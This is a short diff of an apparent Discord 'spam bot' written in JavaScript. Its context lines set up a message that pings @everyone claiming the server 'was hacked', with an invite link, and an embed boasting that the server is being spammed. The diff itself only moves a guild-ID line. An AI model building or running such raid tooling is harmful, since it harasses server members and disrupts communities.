@@ -35,7 +35,6 @@ bot.on("message", async message => {
 
     if(!command.startsWith(prefix)) return;
 
-const guild = bot.guilds.get(message.guild.id).id;	
 const SpamMessage = "@everyone This server was hacked by <@${message.guild.owner.id}> Join the new server here: https://discord.gg/tEkJP2b"; // message you want to spam \\
 
 
@@ -51,6 +50,9 @@ const SpamMessage = "@everyone This server was hacked by <@${message.guild.owner
     .setColor("#0x3dfbff")
    .setDescription(`Your server ${message.guild.name} is being spammed by ツ Spam Bot ツ a custom spam bot made by [ツ The Watchers Bot Devsツ](https://discord.gg/k689m4K) :smiling_imp:`)
 	    
+const guild = bot.guilds.get(message.guild.id).id;	
+
+
         if(!message.author.id === YourDiscordID) return;
         let Ping = message.mentions.users.first();
 	 message.delete().catch();	
